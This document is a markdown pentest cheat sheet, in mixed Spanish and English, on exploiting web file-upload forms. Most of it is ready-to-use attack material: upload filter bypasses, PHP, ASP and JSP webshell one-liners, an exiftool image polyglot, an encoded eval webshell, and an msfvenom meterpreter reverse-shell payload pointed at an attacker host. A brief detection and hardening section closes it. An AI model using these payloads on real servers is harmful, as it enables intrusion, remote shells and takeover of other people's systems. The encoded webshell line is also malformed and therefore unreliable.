---
title: File Upload Vulnerabilities
phase: explotacion
platform: web
tags: [file-upload, web, webshell, bypass]
risk: critical
attack_tactic: TA0002
attack_technique: T1059
data_sources: [web-server-logs, access-logs, ids-ips]
last_review: 2026-05-25
---

# File Upload Vulnerabilities

### Objetivo

Explotar funcionalidades de subida de archivos para obtener ejecución de código via webshells.

### Basic Bypass Techniques

```bash
# Change mime type
curl -X POST -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php -H "Content-Type: multipart/form-data"

# Double extension
shell.php.jpg or shell.php.png

# Null byte
shell.php%00.jpg

# Case transformation
shell.PhP or shell.PHP
```

### Webshell Payloads

```php
<?php system($_GET['cmd']); ?>
<?php echo "<pre>"; system($_REQUEST['cmd']); ?>
<?php eval($_POST['cmd']); ?>
```

```bash
# ASP webshell
<% eval request("cmd") %>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Python (if running uWSGI)
os.system(request.values('cmd'))
```

### Image Upload Bypass (Polyglot)

```bash
# Embed PHP in image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# Remote code upload (zip-based)
echo "<?php system('id'); ?>" > payload.php
zip payload.zip payload.php
# Upload zip, server unzips -> execute
```

### Detection Bypass

```bash
# Using filters (gd image library)
# Clean image with LSB steganography
# Request a legal file then append shell

# Base64 encoded webshell
<?php eval(base64_decode('c3lzdGVtKCRfemlwKSc=')); ?>
```

### One-liners

```bash
# Upload and execute
curl -F "file=@shell.php" http://target.com/upload
curl "http://target.com/uploads/shell.php?cmd=whoami"

# meterpreter via upload
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker LPORT=443 -f raw > shell.php
```

### Detección y Mitigación

- **Visibilidad:** Monitoring upload directory for script files (.php, .asp, .jsp, .svg), web server logs for uploaded content execution.
- **Hardening:** File type validation (magic bytes, not just extension), rename uploaded files, store outside webroot, execute with restricted permissions.

### Validación de Cobertura

- **Prueba técnica:** atomic-red-team T1190 (upload and execute).
- **Criterio de éxito:** Alerts when .php/.asp files are uploaded or executed; web root monitoring.
